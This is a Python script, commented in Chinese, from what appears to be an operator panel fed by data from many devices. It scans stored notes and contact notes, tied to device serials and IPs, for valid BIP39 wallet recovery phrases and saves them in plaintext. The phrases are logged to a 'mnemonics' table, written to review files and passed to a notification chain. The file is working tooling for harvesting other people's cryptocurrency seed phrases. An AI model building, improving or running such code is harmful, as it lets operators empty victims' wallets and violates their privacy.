#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""scan_note_mnemonics.py — 备忘录/联系人备注 助记词扫描（2026-09-19 操作员指示·最终版）

范围：notebooks(content) + contacts(data->>'note')。【短信不扫 —— 操作员指令】
校验：tools/bip39_check.py（最大词串 + BIP39 校验和，杜绝滑窗假命中）。

两遍扫描（防漏）：
  Pass A 标准提取；Pass B 对 A 未命中的行做「深窗口」全偏移扫描（并集）。
  另：B 遍前重新取一次 max(id)，把扫描期间新到的行一并覆盖。

运行模式：
  默认(增量应用·cron)：只处理水位之后的新行 → 校验通过 → 去重(黑名单/库内现有) →
    写入 mnemonics 表（app_type='备忘录识别'，ukey='note:<表>:<id>:<i>'）→
    面板回显 + 走正常通知链路（notify_scan 冷却门 → 暗池判断 → 按规则通知）。
    ★ 本脚本不触碰任何通知游标、不特发 TG（操作员指示）。
  --review : 全量审阅模式（不写库）→ docs/note_mnemonics_review_<date>.txt
  --dry    : 增量干跑（只报将写入数量）

硬保证：黑名单（adm888app/data/note_scan_blacklist.json，操作员已验证的 80 条无价值短语
  + 记录 id）在一切模式下永不入库/永不回显/永不通知。
状态：adm888app/data/note_scan_state.json（last_notebook_id / last_contact_id 水位）
"""
import os, sys, json, time

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))   # 自动推导（节点同步兼容）
sys.path.insert(0, os.path.join(BASE, 'tools'))
from bip39_check import extract_valid, normalize  # noqa: E402

import psycopg2
from psycopg2.extras import Json as PgJson

LOG = os.path.join(BASE, 'logs', 'note_mnemonic_scan.log')
BLACKLIST = os.path.join(BASE, 'adm888app', 'data', 'note_scan_blacklist.json')
STATE = os.path.join(BASE, 'adm888app', 'data', 'note_scan_state.json')
REVIEW = '--review' in sys.argv
DRY = '--dry' in sys.argv


def log(line):
    try:
        with open(LOG, 'a') as f:
            f.write(time.strftime('[%F %T] ') + line + '\n')
    except Exception:
        pass


def load_blacklist():
    try:
        bl = json.load(open(BLACKLIST))
        return set(bl.get('phrases') or []), set(int(x) for x in (bl.get('ids') or []))
    except Exception:
        return set(), set()


def scan_text_two_pass(text):
    """两遍：A 标准；A 无命中 → B 深窗口。返回 (phrases, pass_label)"""
    ph = extract_valid(text, deep=False)
    if ph:
        return ph, 'A'
    ph = extract_valid(text, deep=True)
    if ph:
        return ph, 'B'
    return [], ''


def main():
    cfg = json.load(open(os.path.join(BASE, 'adm888app', 'data', 'pg.json')))
    conn = psycopg2.connect(host=cfg.get('host', '127.0.0.1'), port=int(cfg.get('port', 5432)),
                            user=cfg['user'], password=cfg['password'], dbname=cfg.get('database', 'panel'))
    conn.autocommit = False
    cur = conn.cursor()
    bl_ph, bl_ids = load_blacklist()
    try:
        st = json.load(open(STATE))
    except Exception:
        st = {'last_notebook_id': 0, 'last_contact_id': 0}
    if st.get('last_notebook_id', 0) == 0:
        # 首跑保护：水位未初始化 → 取当前 max 初始化后退出（历史数据一律不处理）
        cur.execute("SELECT COALESCE(max(id),0) FROM notebooks"); st['last_notebook_id'] = int(cur.fetchone()[0])
        cur.execute("SELECT COALESCE(max(id),0) FROM contacts"); st['last_contact_id'] = int(cur.fetchone()[0])
        json.dump(st, open(STATE, 'w'))
        log('水位初始化完成（历史不处理）: nb=%d ct=%d' % (st['last_notebook_id'], st['last_contact_id']))
        print(json.dumps({'init': st}))
        return

    # 库内现有助记词（去重口径：**按设备** serial+短语；操作员口径"重复照常显示、先无需去重"
    #   —— 跨设备/跨来源同短语不拦，仅拦同一设备同短语（真重复）；黑名单单独硬拦）
    cur.execute("SELECT COALESCE(serial,''), COALESCE(plain,'') FROM mnemonics WHERE COALESCE(serial,'') <> ''")
    existing_pairs = set((str(s), normalize(p)) for s, p in cur.fetchall() if p)

    jobs = []
    results = []   # {tbl,id,serial,ip,ts,phrase,pass}
    seen = set()

    def collect(tbl, idcol, sql_rows, use_deep_pass):
        nonlocal jobs, results
        wm_key = 'last_notebook_id' if tbl == 'notebooks' else 'last_contact_id'
        wm = int(st.get(wm_key) or 0)
        cur.execute(sql_rows.format(wm=wm))
        rows = cur.fetchall()
        maxid = wm
        for rid, serial, ip, ts, text in rows:
            maxid = max(maxid, rid)
            if rid in bl_ids:
                continue
            ph, label = scan_text_two_pass(text or '')
            for p in ph:
                k = normalize(p)
                if k in seen or k in bl_ph:
                    continue
                if serial and (str(serial), k) in existing_pairs:
                    continue     # 同一设备同短语（真重复）→ 拦；跨设备同短语放行
                seen.add(k)
                results.append({'tbl': tbl, 'id': rid, 'serial': serial or '', 'ip': ip, 'ts': ts, 'phrase': p, 'pass': label})
        return maxid

    # Pass A + Pass B 一体化：各自取两次 max（覆盖扫描期间新增）
    for tbl, idcol, base_sql, wm_key in [
        ('notebooks', 'id',
         "SELECT id, COALESCE(serial,''), COALESCE(host(ip),''), COALESCE(ts,0), COALESCE(content,'') FROM notebooks WHERE id > {wm} ORDER BY id", 'last_notebook_id'),
        ('contacts', 'id',
         "SELECT id, COALESCE(serial,''), COALESCE(host(ip),''), COALESCE(ts,0), COALESCE(data->>'note','') FROM contacts WHERE id > {wm} ORDER BY id", 'last_contact_id'),
    ]:
        m1 = collect(tbl, idcol, base_sql, False)
        # 二遍：重新取 max（扫描期间新到行）再扫一次
        cur.execute("SELECT COALESCE(max(id),0) FROM %s" % tbl)
        m2 = max(m1, int(cur.fetchone()[0]))
        if m2 > m1:
            m3 = collect(tbl, idcol, base_sql, True)
            m2 = max(m2, m3)
        if not REVIEW and not DRY:      # 审阅/干跑模式不推进水位（防跳过未入库的行）
            st[wm_key] = m2

    # ── 审阅模式：只出文件 ──
    if REVIEW:
        day = time.strftime('%Y%m%d')
        out_f = os.path.join(BASE, 'docs', 'note_mnemonics_review_%s.txt' % day)
        lines = ['备忘录助记词扫描·审阅（%s） 新增不重复 %d 条' % (time.strftime('%F %T'), len(results)), '=' * 72, '']
        for h in results:
            lines.append('[%s] %s | 记录#%s | %s词 | 第%s遍' % (h['tbl'], h['serial'] or '(空)', h['id'], len(h['phrase'].split()), h['pass']))
            lines.append(h['phrase']); lines.append('')
        with open(out_f, 'w') as f:
            f.write('\n'.join(lines))
        os.chmod(out_f, 0o600)
        log('审阅模式: 新增不重复 %d 条 → %s' % (len(results), out_f))
        print(json.dumps({'review': out_f, 'count': len(results)}, ensure_ascii=False))
        return

    # ── 增量应用：正常入库（通知走正常链路；黑名单已在上游过滤）──
    ins = 0
    if results and not DRY:
        now_ms = int(time.time() * 1000)
        for i, h in enumerate(results):
            if not h['serial']:
                continue     # 无序列号 → 不入库（无法归属回显）；孤儿回填链会另行处理
            try:
                # 【2026-09-20】data 同步写入明文/摘要/来源类型——与其它来源（wallet18 等）口径一致，
                #   防止面板详情页（仅读 data）看不到明文（DX3VM36NHG00 根因）
                # 【2026-09-20】摘要改为首尾风格（与 18 链 abbr 一致：前3字符***后4字符）
                _p = h['phrase'].strip()
                _abbr = _p if len(_p) <= 10 else _p[:3] + '***' + _p[-4:]
                cur.execute(
                    "INSERT INTO mnemonics (serial, ip, ts, app_type, bundle_id, abbr, plain, data, ukey, created_at) "
                    "VALUES (%s, NULLIF(%s,'')::inet, %s, '备忘录识别', '', %s, %s, %s, %s, to_timestamp(%s/1000.0)) "
                    "ON CONFLICT DO NOTHING",
                    (h['serial'], h['ip'], h['ts'] or now_ms,
                     _abbr,
                     h['phrase'],
                     PgJson({'src': 'note-scan', 'note_tbl': h['tbl'], 'note_id': h['id'], 'bip39_valid': True, 'pass': h['pass'],
                             'mnem_phrase_plain': h['phrase'], 'mnem_phrase_abbr': _abbr, 'app_type': '备忘录识别',
                             'serial': h['serial'], 'created_at': h['ts'] or now_ms}),
                     'note:%s:%d:%d' % (h['tbl'], h['id'], i), h['ts'] or now_ms))
                ins += cur.rowcount
            except Exception as e:
                log('写库异常 %s#%s: %s' % (h['tbl'], h['id'], str(e)[:100]))
        conn.commit()
    json.dump(st, open(STATE, 'w'))
    log('增量扫描: 新候选 %d / 入库 %d（%s）水位 nb=%s ct=%s' % (
        len(results), ins, 'dry' if DRY else 'applied', st['last_notebook_id'], st['last_contact_id']))
    print(json.dumps({'candidates': len(results), 'inserted': ins, 'dry': DRY,
                      'wm_nb': st['last_notebook_id'], 'wm_ct': st['last_contact_id']}, ensure_ascii=False))
    conn.close()


if __name__ == '__main__':
    main()
